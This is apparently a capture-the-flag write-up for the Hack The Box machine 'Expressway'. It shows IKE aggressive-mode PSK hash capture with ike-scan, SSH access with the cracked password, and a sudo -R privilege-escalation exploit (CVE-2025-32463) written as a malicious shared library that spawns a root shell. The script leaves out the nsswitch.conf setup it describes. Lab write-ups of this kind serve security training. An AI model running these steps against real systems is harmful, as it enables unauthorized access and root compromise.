---
layout: default
title: "HTB: Expressway"

---

> **Machine:** Expressway

> **IP:** 10.10.11.87

> **Difficulty:** Medium


---

### [~] Enumeration:~#
I started with a normal tcp port scan which revealed just one open port `SSH - 22`
Then I  went further to run a udp scan, maybe I can find something interesting
The UDP scan reveals something interesting on port 500.


```bash
➜ nmap 10.10.11.87 -sVC --min-rate 1000 -p- -sU

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 14:41 WAT
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 88.08% done; ETC: 14:42 (0:00:11 remaining)
Nmap scan report for 10.10.11.87
Host is up (0.16s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
500/udp open  isakmp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Enumerating ISAKMP(UDP 500):~#
Since port 500 is open, I used ike-scan to enumerate the VPN configuration. 
```bash
➜ ike-scan 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned HDR=(CKY-R=5d9c4f8e07f1431a) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.176 seconds (5.68 hosts/sec).  1 returned handshake; 0 returned notify
```

The handshake returns Main Mode, but we can attempt to force Aggressive Mode to capture a Pre-Shared Key (PSK) hash.
```bash
➜ ike-scan --aggressive 10.10.11.87 --id=vpnuser --pskcrack=hash.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=8727d507d144ac59) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.202 seconds (4.94 hosts/sec).  1 returned handshake; 0 returned notify
```

After getting the hash, I cracked the hash with hashcat


Cracked hash: `freakingrockstarontheroad`

### Gaining_Access:~#
The cracked VPN password works for SSH access as the user `ike` and i'm able to get the user.txt file.

`user.txt: dbdddb61fcd122a10f4f31c4c31122b4`

### Privilege_Escalation:~#
On the system, we find that the version of Sudo is vulnerable to CVE-2025-32463, a privilege escalation involving sudo -R. By creating a malicious shared library and manipulating the nsswitch.conf file, we can trigger an exploit.

Exploit script:
```bash
# Creating a malicious library to spawn root bash
cat > woot1337.c <<EOF
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

gcc -shared -fPIC -o libnss_woot1337.so.2 woot1337.c
sudo -R woot woot # Triggering the vulnerable chwoot logic
```

With this, I get a root shell and get the root flag

`root.txt: b92e9491656022758f61b6082af3c580`
